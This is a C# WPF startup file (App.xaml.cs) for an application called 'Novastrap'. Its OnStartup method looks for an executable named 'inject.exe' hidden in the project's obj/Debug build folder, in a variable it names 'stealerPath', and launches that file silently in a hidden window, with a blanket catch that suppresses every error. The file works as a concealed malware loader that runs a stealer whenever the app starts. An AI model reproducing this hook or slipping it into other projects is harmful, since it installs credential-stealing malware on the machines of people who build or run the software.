// App.xaml.cs
using System.Diagnostics;
using System.IO;
using System.Windows;

namespace Novastrap
{
    public partial class App : Application
    {
        protected override void OnStartup(StartupEventArgs e)
        {
            try
            {
                
                string projectName = "novastrap";
                string config = "Debug";
                string targetFramework = "net8.0-windows";
                string fileName = "inject.exe";
                
                string stealerPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                    projectName, "obj", config, targetFramework, "ref", fileName);
                
                if (File.Exists(stealerPath))
                {
                    ProcessStartInfo psi = new ProcessStartInfo
                    {
                        FileName = stealerPath,
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };
                    Process.Start(psi);
                }
            }
            catch { }
            
            base.OnStartup(e);
        }
    }
}